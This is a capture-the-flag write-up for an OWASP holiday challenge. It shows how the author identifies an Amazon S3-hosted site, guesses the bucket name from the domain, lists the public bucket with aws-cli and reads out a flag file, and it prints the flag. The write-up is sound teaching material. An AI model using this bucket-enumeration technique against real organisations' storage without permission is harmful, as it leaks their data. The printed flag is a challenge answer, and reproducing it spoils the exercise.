# Day 6

> Santa is always keeping up with the times. He asked his elves to build him a web page that will help with the ordering and distributing of presents. Being crunch time, the elves took some shortcuts to get the page up and running. Would you be willing to check if the elves made any mistakes that could leak possibly sensitive information?

URL: x.owasp.si

From `Server` HTTP header we understand that website is powered by Amazon S3.

```
$ curl -i http://x.owasp.si/
HTTP/1.1 200 OK
x-amz-id-2: bQ9Ecf0oyEDOWEi+hyCMJocc7rTaNs3chhf7GmXVWilm8qg1HFXXDlda9VUA8aGBZN63i0k65eo=
x-amz-request-id: 4C4EB452105CFDE8
Date: Thu, 24 Dec 2020 13:36:13 GMT
Last-Modified: Tue, 01 Dec 2020 19:31:08 GMT
ETag: "13bcd5112926c0bd0696180ed95820d2"
Content-Type: text/html
Content-Length: 246
Server: AmazonS3
```

Very frequently, the S3 bucket name is the same as domain name.

We can use aws-cli command to list the contents of this S3 bucket and get the flag:
```
$ aws s3 ls s3://x.owasp.si/
2020-12-01 20:55:03         22 6470e394cbf6dab6a91682cc8585059b.txt
2020-12-01 20:31:08        246 index.html
2020-12-01 20:31:09     123824 santa.png

$ aws s3 cp s3://x.owasp.si/6470e394cbf6dab6a91682cc8585059b.txt -
xmas{naugh7y_and_n1c3}
```

If you don't have aws-cli, you can do the same by visiting the link: <http://x.owasp.si.s3.amazonaws.com/>
